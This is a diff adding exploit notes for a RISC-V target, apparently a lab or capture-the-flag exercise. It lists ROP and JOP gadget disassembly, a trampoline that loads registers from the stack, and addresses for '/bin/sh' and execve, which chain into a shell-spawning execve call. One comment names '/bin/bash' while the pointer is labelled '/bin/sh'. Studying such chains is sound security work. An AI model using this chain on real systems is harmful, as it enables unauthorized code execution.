@@ -1,0 +1,59 @@
+// Trampoline Gadget:
+ra = 0x00000020000afd72
+// Loads ra, s0-s7 from stack, increments stack, jumps to ra
+   89d72:	60a6                	ld	ra,72(sp)
+   89d74:	6406                	ld	s0,64(sp)
+   89d76:	74e2                	ld	s1,56(sp)
+   89d78:	7942                	ld	s2,48(sp)
+   89d7a:	79a2                	ld	s3,40(sp)
+   89d7c:	7a02                	ld	s4,32(sp)
+   89d7e:	6ae2                	ld	s5,24(sp)
+   89d80:	6b42                	ld	s6,16(sp)
+   89d82:	6ba2                	ld	s7,8(sp)
+   89d84:	6161                	addi	sp,sp,80
+   89d86:	8082                	ret
+
+// pointer to string
+"/bin/sh" = 0x20001178a8
+
+// a0 = "/bin/sh", a1 = 0, a2 = 0
+// execve("/bin/bash", NULL, NULL)
+// execve = 0x20000ad180 
+
+// Loads s4 into a2, s3 into a1, s5 into a0, jumps to s1
+// 0x20000deb0a:
+   b8b0a:	8652                	mv	a2,s4
+   b8b0c:	85ce                	mv	a1,s3
+   b8b0e:	8556                	mv	a0,s5
+   b8b10:	9482                	jalr	s1
+
+
+UNUSED JOP Gadgets:
+// Copy register value to a0
+Loads s1 into a0, jumps to s2
+   97a06:	8526                	mv	a0,s1
+   97a08:	9902                	jalr	s2
+
+// Loads 0 into a1, jumps to s1
+   a6ca6:	4581                	li	a1,0
+   a6ca8:	9482                	jalr	s1
+
+// Loads s0 into a1, loads s3 into a0
+   a741e:	85a2                	mv	a1,s0
+   a7420:	854e                	mv	a0,s3
+   a7422:	9a02                	jalr	s4
+
+// Loads *(s3 + 32) into a5, loads s6 into a0, jumps to a5
+   97a1e:	0209b783          	ld	a5,32(s3)
+   97a22:	855a                	mv	a0,s6
+   97a24:	9782                	jalr	a5
+
+
+// Loads *(s0 + 64) into a5, loads *(s0 + 24) into a0, jumps to a5
+   a06ce:	603c                	ld	a5,64(s0)
+   a06d0:	6c08                	ld	a0,24(s0)
+   a06d2:	65a2                	ld	a1,8(sp)
+   a06d4:	02840693          	addi	a3,s0,40
+   a06d8:	4609                	li	a2,2
+   a06da:	9782                	jalr	a5
+
